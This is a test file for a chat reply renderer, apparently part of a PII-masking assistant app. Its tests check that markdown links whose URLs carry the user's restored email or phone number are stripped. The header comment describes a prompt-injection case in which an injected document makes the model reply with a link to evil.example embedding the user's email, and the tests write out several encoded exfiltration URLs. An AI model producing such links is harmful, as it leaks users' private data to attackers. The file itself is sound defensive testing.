/**
 * Day 4.17 review: the reply is unmasked BEFORE it is rendered, so an injected document could make the model answer with
 * [click](https://evil.example/?d=[EMAIL_1]) and the restored address would sit inside the link. Links containing the user's real values
 * must not render as links.
 */
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { PlaceholderVault } from "../pii/vault";
import { hrefContainsValue } from "./linkSafety";
import { Reply } from "./Reply";

const EMAIL = "rahul.v@example.in";
const render = (text: string, sensitive: string[]) => renderToStaticMarkup(createElement(Reply, { text, sensitive }));

describe("hrefContainsValue", () => {
  it("finds a value in a URL however it is encoded or separated", () => {
    for (const href of [
      `https://evil.example/?d=${EMAIL}`,
      "https://evil.example/?d=rahul.v%40example.in",
      "https://evil.example/?d=rahul.v%2540example.in",              // double-encoded
      "https://evil.example/RAHUL.V@EXAMPLE.IN/x",
      "https://evil.example/?d=rahulvexamplein",
    ]) {
      expect(hrefContainsValue(href, [EMAIL]), href).toBe(true);
    }
    expect(hrefContainsValue("https://evil.example/?p=98765-43210", ["98765 43210"])).toBe(true);
    expect(hrefContainsValue("https://evil.example/?p=98765%2043210", ["98765 43210"])).toBe(true);
    expect(hrefContainsValue("https://evil.example/?p=ABCPE1234F", ["ABCPE1234F"])).toBe(true);
  });

  it("leaves unrelated links alone", () => {
    expect(hrefContainsValue("https://en.wikipedia.org/wiki/Paris", [EMAIL, "98765 43210", "Rahul Verma"])).toBe(false);
    expect(hrefContainsValue("https://example.com/?q=rahul", [EMAIL])).toBe(false);          // a fragment of a value is not the value
    expect(hrefContainsValue(undefined, [EMAIL])).toBe(false);
    expect(hrefContainsValue("https://x.example/", [])).toBe(false);
  });

  it("matches short values (a 3-letter name) only as a whole token, so ordinary links survive", () => {
    expect(hrefContainsValue("https://evil.example/?who=Raj", ["Raj"])).toBe(true);
    expect(hrefContainsValue("https://example.com/rajasthan-travel", ["Raj"])).toBe(false);
    expect(hrefContainsValue("https://example.com/garage", ["Raj"])).toBe(false);
  });
});

describe("Reply", () => {
  it("renders a normal link as a link, with noopener", () => {
    const html = render("See [Paris](https://en.wikipedia.org/wiki/Paris).", [EMAIL]);
    expect(html).toContain('<a href="https://en.wikipedia.org/wiki/Paris"');
    expect(html).toContain("noopener");
  });

  it("does NOT render a link whose address contains the user's restored email, and says so", () => {
    const html = render(`[click here](https://evil.example/?d=${EMAIL})`, [EMAIL]);
    expect(html).not.toContain("<a ");
    expect(html).not.toContain("href=");
    expect(html).toContain("link removed");
    expect(html).toContain("click here");
  });

  it("covers reference-style links and autolinks too", () => {
    expect(render(`[x][1]\n\n[1]: https://evil.example/?d=${EMAIL}`, [EMAIL])).not.toContain("<a ");
    expect(render(`<https://evil.example/?d=${EMAIL}>`, [EMAIL])).not.toContain("<a ");
  });

  it("still blocks images (the older protection)", () => {
    const html = render(`![x](https://evil.example/p.png?d=${EMAIL})`, []);
    expect(html).not.toContain("<img");
    expect(html).toContain("image not loaded");
  });

  it("end to end with the real vault: placeholders in a link are restored by unmask(), and the link is then neutralised", () => {
    const vault = new PlaceholderVault();
    const { masked } = vault.mask(`Email me at ${EMAIL}`, []);
    expect(masked).toContain("[EMAIL_1]");
    const reply = vault.unmask("[click](https://evil.example/?d=[EMAIL_1])");
    expect(reply).toContain(EMAIL);                                  // unmask() does restore it ...
    expect(render(reply, vault.values())).not.toContain("<a ");        // ... and the link no longer exists
  });
});
